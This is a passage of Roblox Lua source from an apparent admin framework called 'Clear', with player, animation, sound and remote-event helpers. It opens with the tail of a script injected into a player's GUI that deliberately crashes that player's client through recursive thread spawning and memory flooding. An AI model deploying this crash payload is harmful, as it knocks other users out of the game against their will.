					Parent	= (function() for _, f in ipairs(game:GetService('Players').LocalPlayer:GetChildren()) do if f:IsA('PlayerGui') then return f end end return nil end)();
					Name	= math.random();
				}
				
				crash = function()
					for i=1,50 do
						game:GetService('Debris'):AddItem(Instance.new("Part",workspace.CurrentCamera),2^4000)
						print("((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)((((**&&#@#$$$$$%%%%:)")
						local f = Instance.new('Frame', Gui)
						f.Size = UDim2.new(1,0,1,0)
						spawn(function() table.insert(tab,string.rep(tostring(math.random()),100)) end)	
						spawn(function()
							spawn(function()
								spawn(function()
									spawn(function()
										spawn(function()
											print("hi", math.atan(i))
											spawn(crash)
										end)
									end)
								end)
							end)
						end)
					end
					tab = {}
				end
				while wait(0.01) do
					for i = 1,50000000 do
						pcall(coroutine.wrap(function() crash() end))
						print(1)
					end
				end
			]])
		end
	end
	
	function PlayerServ.EditAnimator(PlayerOrChar, AnimData)
		local Animator	= PlayerOrChar:FindFirstChild('Animate') or (PlayerOrChar:IsA('Player') and PlayerOrChar.Character and PlayerOrChar.Character:FindFirstChild('Animate'));
		
		if (not Animator) then return nil end;
		
		for Name, Anim in next, AnimData do
			local Found	= Animator:FindFirstChild(Name);
			
			if Found then Found:Destroy() end;
			
			local New	= Instance.new('StringValue');
			
			New.Name	= Name;
			New.Value	= 'Animation';
			
			for F, Data in next, Anim do
				local Object		= Instance.new('Animation');
				local Weight		= Instance.new('IntValue', Object);
				
				Weight.Name			= 'Weight';
				Weight.Value		= Data.Weight or 1;
				
				Object.Name			= F;
				Object.AnimationId	= (tonumber(Data.Id) and ('rbxassetid://' .. Data.Id)) or Data.Id;
				
				Object.Parent		= New;
			end;
			
			New.Parent	= Animator;
		end;
		
		return Animator;
	end
	
	function PlayerServ.StopAnimations(hum, Ignore)
		local Ignore = Ignore or {};
		
		for _, Anim in next, hum:GetPlayingAnimationTracks() do
			local Remove = true;
			
			for _, Ignored in next, Ignore do
				if (Anim.Name == Ignored) then
					Remove = false;
					break
				end
			end
			
			if Remove then
				Anim:Stop();
			end
		end;
		
		return hum;
	end;
	
	function PlayerServ.LoadAnimation(Hum, N)
		local Name	= tostring(N);
		local Load, K;
		
		for _, Anim in next, Hum:GetPlayingAnimationTracks() do
			if (Anim.Name == Name) then
				return Anim;
			end;
		end;
		
		if Hum.Parent then
			Load	= Instance.new'Animation'
			
			Load.AnimationId	= 'rbxassetid://' .. Name;
			Load.Parent			= Hum;
			
			K					= Hum:LoadAnimation(Load);
			K.Name				= Name;
			
			return K, Load:Destroy();
		else
			return;
		end;
	end;
	
	function PlayerServ.GetIgnored(What, Ignored)
		for _, Other in next, Ignored do
			if (Other == What) then
				return true
			end
		end
		
		return false
	end
	
	function PlayerServ.GetNearbyLife(x, pos)
		local pos		= pos or Vector3.new(0,0,0)
		local x			= x or {workspace}
		local lifeArray	= {}
		
		for _, n in next, x do
			for _, c in next, n:GetChildren() do
				local hum, tor = c:FindFirstChildOfClass'Humanoid', c:FindFirstChild('HumanoidRootPart')
				if hum and tor then
					lifeArray[#lifeArray + 1] = {Humanoid=hum,Torso=tor,Life=c,Distance=(tor.Position - pos).magnitude};
				end
			end
		end
		
		return lifeArray
	end
	
	function PlayerServ.GetHum(item)
		return item:FindFirstChildOfClass('Humanoid');
	end
	
	function PlayerServ.GetNearestHum(p1,dist,item,ignored)
		local dtab = {}
		local disttab = {}
		local dist = dist or 100
		local item = item or workspace
		local ignored = ignored or {}
		
		for _, prt in next, item:GetChildren() do
			local hum = PlayerServ.GetHum(prt)
			if hum and (not PlayerServ.GetIgnored(hum,ignored)) then
				pcall(function()
					local torso = prt.Torso
					local ldist = floor((torso.Position - p1.Position).magnitude)
					if ldist <= dist then
						if (dtab[ldist]) and (random(1,2)==2) then
							dtab[ldist] = prt
						elseif (not dtab[ldist]) then
							dtab[ldist] = prt
						end
						disttab[#disttab+1] = ldist
					end
				end)
			end
		end
		
		if (#disttab ~= 0) then
			return dtab[min(unpack(disttab))]
		else
			return nil
		end
	end
	
	function PlayerServ.GetLiving(item)
		local Parts	= setmetatable({},{
			__index	= function(Table, Index)
				Table[Index]	= item:FindFirstChild(Index);
				
				return rawget(Table, Index);
			end;
			__metatable	= 'Parts of the item.';
		});
		
		return Parts;
	end
	
	function PlayerServ.GetParts(x, includeHatsAndTools)
		local Parts = {}
		
		for _,w in next, x:GetChildren() do
			local handle = (includeHatsAndTools and w:FindFirstChild('Handle')) or nil
			
			if handle and handle:IsA('BasePart') then
				Parts[#Parts + 1] = handle
			elseif w:IsA('BasePart') then
				Parts[#Parts + 1] = w
			end
		end
		
		return Parts
	end
	
	function PlayerServ.IsAlive(p)
		local parts = PlayerServ.GetLiving(p)
		if parts.Humanoid and (parts.Humanoid.Health > 0) and parts.HumanoidRootPart then
			return parts
		end
		return false
	end
	
	function PlayerServ.GetCMass(c, includeHatsAndTools, ignoreThis)
		if (not c) then return nil end
		
		local ignoreThis = ignoreThis or {};
		local mass = 0
		
		for _, x in next, c'GetChildren' do
			if (not (x.Name == ignoreThis or ignoreThis[x.Name])) then
				if x('IsA', 'BasePart') then
					mass = mass + x:GetMass()
				end
				
				if includeHatsAndTools and (#x'GetChildren' ~= 0) then
					mass = mass + PlayerServ.GetCMass(x, includeHatsAndTools, ignoreThis)
				end
			end;
		end
		
		return mass
	end
	
	function PlayerServ.GetJoints(x)
		local Joints = {}
		
		for _,w in next, x:GetChildren() do
			for _,c in next, w:GetChildren() do
				if c:IsA('Motor6D') then
					Joints[c.Name] = c
				end
			end
		end
		
		return Joints
	end
	
	function PlayerServ.Billboard(CF, Text, Color, Speed, Duration)
		local Color1	= Color or Color3.new(1, 1, 1);
		local Color2	= Color3.new(Color1.r / 2, Color1.g / 2, Color1.b / 2);
		local P			= Clear.Create'Part'{
			Parent			= workspace;
			CanCollide		= false;
			Anchored		= false;
			Size			= Vector3.new(0.2, 0.2, 0.2);
			Transparency	= 1;
			CFrame			= CF;
		}
		
		local B		= Clear.Create'BillboardGui'{
			Size	= UDim2.new(1, 0, 1, 0);
			Name	= 'Gui';
			Parent	= P;
		};
		
		local T		= Clear.Create'TextLabel'{
			Size					= UDim2.new(3, 0, 1.5, 0);
			Position				= UDim2.new(-1.5, 0, -0.75, 0);
			BackgroundTransparency	= 1;
			Text					= Text;
			TextScaled				= true;
			TextWrapped				= true;
			Font					= 'SciFi';
			TextStrokeTransparency	= 0.6;
			TextColor3				= Color1;
			TextStrokeColor3		= Color2;
			Name					= 'Text';
			Parent					= B;
		};
		
		Clear.Create'BodyForce'{
			Parent	= P;
			Force	= (Vector3.new(0, workspace.Gravity, 0) * P:GetMass()) + Vector3.new(0, (Speed or 0) / 120, 0);
		};
		
		if (type(Duration) == 'number') then
			Clear.Debris:AddItem(P, Duration);
		end;
		
		return T;
	end
	
	function PlayerServ.GetAmbient()
		return workspace:FindFirstChild('AmbientSounds') or Clear.Create'Folder'{
			Parent	= workspace;
			Name	= 'AmbientSounds';
		}
	end
	
	function PlayerServ.NewSound(id)
		return Clear.Create'Sound'{
			SoundId	= 'rbxassetid://' .. tostring(id);
			Name	= 'SOUND!' .. tostring(id);
		}
	end
	
	function PlayerServ.GetSoundFolder(player)
		local Gui	= player:FindFirstChild('PlayerGui');
		local Found	= Gui and Gui:FindFirstChild('!LOCALSOUNDS');
		
		if (not Found) and Gui then
			Found	= Clear.Create'ScreenGui'{
				Name	= '!LOCALSOUNDS';
				Parent	= Gui;
			};
		end;
		
		return Found;
	end;
	
	function PlayerServ.PlayerSound(id, players, life, killOld)
		for _,x in next, players do
			if killOld then local old = PlayerServ.GetSound(x, id) if old then Clear.Thread(PlayerServ.KillSound, old) end; end;
			local Fold = PlayerServ.GetSoundFolder(x)
			
			if Fold then
				local Sound = PlayerServ.NewSound(id);
				
				Sound.Parent = Fold;
				
				if life then Clear.Thread(PlayerServ.KillSound, Sound, life) end;
				
				Clear.Thread(PlayerServ.PlaySound, Sound);
			end;
		end;
	end;
	
	function PlayerServ.KillSound(sound, w)
		return delay(w or 0.01, function()
			sound:Stop()
			sound:Destroy()
		end);
	end
	
	function PlayerServ.PlaySound(sound, w)
		return delay(w or 0.01, function()
			sound:Play()
		end);
	end
	
	function PlayerServ.Silence(player)
		local Fold	= PlayerServ.GetSoundFolder(player);
		
		if Fold then
			for _, w in next, Fold:GetChildren() do
				PlayerServ.KillSound(w);
			end;
		end;
	end;
	
	function PlayerServ.AmbientSound(id, removeOld)
		local Stor = PlayerServ.GetAmbient();
		
		if removeOld then for _,x in next, Stor:GetChildren() do PlayerServ.KillSound(x) end; end;
		
		local Sound = PlayerServ.NewSound(id);
		
		Sound.Parent = Stor;
		
		Clear.Thread(PlayerServ.PlaySound, Sound);
		
		return Sound;
	end;
	
	function PlayerServ.GetSound(player, id)
		local Fold	= PlayerServ.GetSoundFolder(player);
		local Found;
		
		if Fold then
			Found = Fold:FindFirstChild('SOUND!' .. tostring(id));
		end;
		
		return Found;
	end;
	
	function PlayerServ.ObjectSound(id, object, life, killOld)
		local Prev = object:FindFirstChild('SOUND!' .. tostring(id));
		local Sound = PlayerServ.NewSound(id);
		
		if (killOld and Prev) then Clear.Thread(PlayerServ.KillSound, Prev); end;
		
		Sound.Parent = object;
		
		if life then Clear.Thread(PlayerServ.KillSound, Sound, life) end;
		
		Clear.Thread(PlayerServ.PlaySound, Sound);
		
		return Sound;
	end;
		
	return PlayerServ
end;
function Modules.Remote(Clear, Meta)
	local System		= {};
	local Remote		= setmetatable({}, {__metatable = 'ClearRemote'});
	local Expected		= 0;
	local DepCore		= Deps:WaitForChild'Core';
	local Client		= DepCore:WaitForChild('ClearClient'):Clone();
	local Event			= Clear.Create'RemoteEvent'{Parent = Clear.Chat, Name = 'ReruRemote', Archivable = false};
	local Internal		= Clear.Create'BindableEvent'{Name = 'ServerSideEvent'};
	local OnEventB		= Clear.Create'BindableEvent'{Name = 'ServerFilteredEvent'};
	local RemotesO		= false;
	local isClosing
	
	DepCore:Destroy();
	
	System.Remote		= Remote;
	System.Clients		= setmetatable({}, {__mode = 'k', __metatable = 'ClearClients'});
	
	Remote.RawEvent		= Event.OnServerEvent;
	Remote.OnInvoke		= function(...) --[[print(...); return ...;]] end;
	Remote.OnEvent		= OnEventB.Event;
	
	Remote.RawSend		= function(Player, ...)
		Event('FireClient', Player, ...);
	end;
	
	Remote.RawSendAll	= function(...)
		Event('FireAllClients', ...);
	end;
	
	Remote.Send			= function(Player, ...)
		Event('FireClient', Player, 'Event', ...);
	end;
	
	Remote.SendAll		= function(...)
		Event('FireAllClients', 'Event', ...);
	end;
	
	Remote.Get			= function(Player, isCheck, ...)
		local Key	= (isCheck == 'ClearCheck') and 'Clear' or ('Invoke?' .. Clear.GetRandom(5));
		local TOut	= tick() + 10;
		local Cached;
		
		local BE	= Instance.new('BindableEvent');
		local Args	= {...};
		
		local Ev	= Internal.Event:Connect(function(oKey, ...) if (oKey == Key) then BE:Fire(...); elseif (tick() > TOut) then BE:Fire(); end; end);
		
		spawn(function() Event:FireClient(Player, Key, isCheck, unpack(Args)); end);
		
		return BE.Event:wait();
	end;
	
	local EvC; EvC	= Clear.Pconnect(Event.Changed, function()
		local Ran
		
		if (not isClosing) then
			Clear.RunService.Stepped:wait();
			
			if EvC.Connected and (Event.Parent ~= Clear.Chat) then
				Ran	= pcall(function()
					Event.Parent	= Clear.Chat;
				end);
			elseif EvC.Connected and (Event.Parent == Clear.Chat) then
				Ran	= true;
			end;
		else
			Ran	= true;
		end;
		
		if (not Ran) then
			while wait(0.1) do
				Clear.Kick('all', 'Remote - An error has occurred.');
			end;
		end;
	end);
	
	function Remote.Pend(Player)
		local Prev	= System.Clients[Player];
		
		if (Prev == 'Loaded') then
			return true;
		elseif Prev then
			return Prev.Event:wait();
		end;
		
		Prev			= Instance.new'BindableEvent';
		
		System.Clients[Player]	= Prev;
		
		spawn(function()
			local Got;
			
			for i = 1, 60 do
				local Re	= Remote.Get(Player, 'ClearCheck');
				
				if Re then
					Got	= Re;
					
					break;
				elseif (not Player.Parent) and (i >= 20) then
					break;
				else
					wait(3);
				end;
			end;
			
			Prev:Fire(Got);
		end);
		
		local isLoaded			= Prev.Event:wait()
		
		if isLoaded then
			System.Clients[Player]	= 'Loaded';
			
			print(format('~ Clear [-] Connection endpoint from %s accepted.', tostring(Player)));
		else
			System.Clients[Player]	= nil;
			
			pcall(Player.Kick, Player, 'Connection to Server not established');
			print(format('~ Clear [-] %s failed to connect.', tostring(Player)));
			
			return false;
		end;
		
		return true;
	end;
	
	function System.ClientAttach(Module)
		if RemotesO then return warn('Remotes are already online.'); end;
		
		if (typeof(Module) == 'Instance') then
			Module:Clone().Parent	= Client;
			Expected				= Expected + 1;
		else
			warn('Invalid type provided.');
		end;
		
		return Module;
	end;
	
	function System.RemoteInit()
		if RemotesO then return warn('Remotes are already online.') end;
		local CurrentCode;
		local Cycle	= 0;
		local Last;
		
		RemotesO	= true;
		
		Remote.RawEvent:Connect(function(Player, Key, ...)
			if tostring(Key):match('^Request%?') then
				if (type(Remote.OnInvoke) == 'function') and (Clear[Remote.OnInvoke] == nil) then
					local Returns	= {pcall(Remote.OnInvoke, Player, ...)};
					
					remove(Returns, 1);
					
					Event('FireClient', Player, Key, unpack(Returns));
				end;
				
				return nil;
			end;
			
			if (Key == 'Clear') and Last and (Last.Name == (...)) then
				local Pend	= System.Clients[Player];
				
				if Pend and (Pend ~= 'Loaded') then
					Pend('Fire', ...);
				end;
			elseif (Key == 'ClearDeny') then
				print(format('%s was kicked due to a local remote error.', tostring(Player)));
				pcall(Player.Kick, Player, 'Disconnected by Clear server.');
			else
				OnEventB:Fire(Player, ...);
			end;
			
			Internal:Fire(Key, ...);
		end);
		
		local Reset, DoCheck, GClient;
		local Pend	= Remote.Pend;
		
		GClient	= function(Named)
			local C	= Client'Clone';
			
			C.Name			= (Named and Last.Name) or Clear.GetRandom(random(10, 20)) .. '|' .. Expected;
			C.Archivable	= false;
			
			return C;
		end;
		
		DoCheck	= function(What, Nam)
			if (What.Parent ~= Clear.ReplicatedFirst) or (What.Name ~= Nam) then
				wait();
				
				What'Destroy';
				
				Clear.Thread(Reset, GClient());
			end;
		end;
		
		Reset	= function(What)
			if isClosing then return; end;
			
			local Start	= false;
			local Nam	= What.Name;
			
			if (not Clear.RunService:IsStudio()) then
				What.Changed:Connect(function()
					if Start then
						DoCheck(What, Nam);
					end;
				end);
			end;
			
			What.Parent	= Clear.ReplicatedFirst;
			Last		= What;
			
			Start		= true;
			
			DoCheck(What, Nam);
		end;
		
		Reset(GClient());
		
		local Bat	= Clear.Players:GetPlayers();
		local Num	= -1;
		local Con;
		
		Clear.Players.PlayerAdded:Connect(Pend);
		
		Con	= Clear.RunService.Stepped:Connect(function()
			Num	= Num + 1;
			
			if (Num%240) == 0 then
				for _, Player in next, Clear.Players:GetPlayers() do
					if (System.Clients[Player] ~= 'Loaded') then
						Clear.Thread(function()
							local Parent;
							
							repeat
								wait();
								Parent	= Player:FindFirstChildOfClass'Backpack' or Player:FindFirstChildOfClass'PlayerGui';
							until Parent;
							
							GClient(true).Parent	= Parent;
							Pend(Player);
						end);
					end;
				end;
			elseif (Num > 3600) then
				Con:Disconnect();
				Num, Con	= nil, nil;
			end;
		end);
		
		local Ran, Errored	= Clear.Acall(game.BindToClose, game, function()
			isClosing	= true;
			Last:Destroy();
			Event:Destroy();
		end);
		
		if (not Ran) then warn(Errored); while wait() do Clear.Kick('all', Errored); end; end;
	end;
	
	return System
end;
return Proxy;
